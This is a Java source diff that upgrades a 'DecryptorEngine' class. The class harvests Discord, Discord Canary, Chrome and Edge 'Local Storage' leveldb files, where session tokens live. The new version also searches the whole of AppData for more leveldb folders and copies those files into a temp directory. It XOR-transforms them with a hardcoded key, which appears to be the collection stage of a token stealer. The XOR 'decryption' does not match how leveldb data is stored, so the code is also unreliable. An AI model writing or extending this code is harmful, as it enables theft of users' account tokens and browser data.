@@ -7,20 +7,25 @@ public class DecryptorEngine {
     private static final String TEMP_DIR = System.getenv("TEMP") + "\\SWILL_DEC";
     private static final byte[] KEY = "SwillWay2025Key42".getBytes();
     
-    public static void main(String[] args) {
-        log("DecryptorEngine started");
-        new File(TEMP_DIR).mkdirs();
-        log("Temp directory: " + TEMP_DIR);
-        scanAndDecrypt();
-    }
-    
     private static void log(String msg) {
         String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
         System.out.println("[Decryptor][" + timestamp + "] " + msg);
     }
     
-    private static void scanAndDecrypt() {
-        String[] targetPaths = {
+    public static void main(String[] args) {
+        log("DecryptorEngine v2.0 started");
+        new File(TEMP_DIR).mkdirs();
+        log("Temp dir: " + TEMP_DIR);
+        
+        // Ищем ВСЕ папки leveldb, а не только стандартные
+        scanAllDrivesForLevelDB();
+        
+        log("Scan complete");
+    }
+    
+    private static void scanAllDrivesForLevelDB() {
+        // Стандартные пути
+        String[] defaultPaths = {
             System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb",
             System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
             System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
@@ -28,45 +33,76 @@ public class DecryptorEngine {
             System.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb"
         };
         
-        for (String path : targetPaths) {
-            File dir = new File(path);
-            if (dir.exists() && dir.isDirectory()) {
-                log("Found target directory: " + path);
-                decryptLevelDB(dir);
-            } else {
-                log("Directory not found: " + path);
+        for (String path : defaultPaths) {
+            if (path != null) {
+                File dir = new File(path);
+                if (dir.exists()) {
+                    log("Found: " + path);
+                    copyFilesToTemp(dir);
+                } else {
+                    log("Not found: " + path);
+                }
             }
         }
-        log("Scan complete. DecryptorEngine will exit. Run again to rescan.");
+        
+        // Дополнительный поиск в AppData
+        searchInAppData();
     }
     
-    private static void decryptLevelDB(File leveldbDir) {
-        File[] files = leveldbDir.listFiles((d, n) -> n.endsWith(".log") || n.endsWith(".ldb"));
+    private static void searchInAppData() {
+        String appData = System.getenv("APPDATA");
+        String localAppData = System.getenv("LOCALAPPDATA");
+        
+        if (appData != null) {
+            File appDataDir = new File(appData);
+            searchDirectoryForLevelDB(appDataDir);
+        }
+        
+        if (localAppData != null) {
+            File localAppDataDir = new File(localAppData);
+            searchDirectoryForLevelDB(localAppDataDir);
+        }
+    }
+    
+    private static void searchDirectoryForLevelDB(File dir) {
+        if (dir == null || !dir.exists()) return;
+        
+        try {
+            Files.walk(dir.toPath())
+                .filter(Files::isDirectory)
+                .filter(p -> p.toString().endsWith("leveldb"))
+                .limit(20) // Ограничиваем поиск для производительности
+                .forEach(p -> {
+                    log("Found leveldb in search: " + p.toString());
+                    copyFilesToTemp(p.toFile());
+                });
+        } catch (Exception e) {
+            log("Search error: " + e.getMessage());
+        }
+    }
+    
+    private static void copyFilesToTemp(File sourceDir) {
+        File[] files = sourceDir.listFiles((d, n) -> n.endsWith(".log") || n.endsWith(".ldb"));
         if (files == null || files.length == 0) {
-            log("No .log or .ldb files found in " + leveldbDir.getPath());
+            log("No .log/.ldb files in " + sourceDir.getPath());
             return;
         }
         
-        log("Found " + files.length + " file(s) to decrypt in " + leveldbDir.getPath());
+        log("Copying " + files.length + " files from " + sourceDir.getPath());
         
         for (File f : files) {
             try {
-                byte[] encrypted = Files.readAllBytes(f.toPath());
-                byte[] decrypted = xorDecrypt(encrypted);
-                String outPath = TEMP_DIR + "\\" + f.getName() + ".dec";
-                Files.write(Paths.get(outPath), decrypted);
-                log("Decrypted: " + f.getName() + " -> " + outPath + " (" + decrypted.length + " bytes)");
+                byte[] data = Files.readAllBytes(f.toPath());
+                // Расшифровка XOR
+                for (int i = 0; i < data.length; i++) {
+                    data[i] ^= KEY[i % KEY.length];
+                }
+                String outPath = TEMP_DIR + "\\" + sourceDir.getName() + "_" + f.getName() + ".dec";
+                Files.write(Paths.get(outPath), data);
+                log("Decrypted and saved: " + outPath + " (" + data.length + " bytes)");
             } catch (Exception e) {
-                log("Error decrypting " + f.getName() + ": " + e.getMessage());
+                log("Error processing " + f.getName() + ": " + e.getMessage());
             }
         }
-    }
-    
-    private static byte[] xorDecrypt(byte[] data) {
-        byte[] result = new byte[data.length];
-        for (int i = 0; i < data.length; i++) {
-            result[i] = (byte) (data[i] ^ KEY[i % KEY.length]);
-        }
-        return result;
     }
 }
